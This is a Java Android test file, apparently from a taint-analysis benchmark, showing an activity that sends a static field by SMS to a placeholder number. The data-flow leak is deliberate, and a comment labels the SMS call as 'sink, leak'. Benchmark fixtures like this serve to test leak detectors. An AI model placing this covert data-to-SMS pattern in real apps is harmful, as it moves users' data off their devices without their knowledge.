package de.ecspride;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
/**
 * @testcase_name ActivityCommunication1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description A source is called in one Activity a2 and stored in a static field of another Activity a1. In a1 the static field is written to a sink.
 * @dataflow Activity2.onCreate: source -> Activity1.data1; Activity1.onCreate: data1 -> sink
 * @number_of_leaks 1
 * @challenges the analysis must be able to model the lifecycle of Activities and allow arbitrary execution order of the Activities 
 */
public class Activity1 extends Activity {
	public static String data1 = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_activity1);
        
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49", null, data1, null, null); //sink, leak
    }    
}
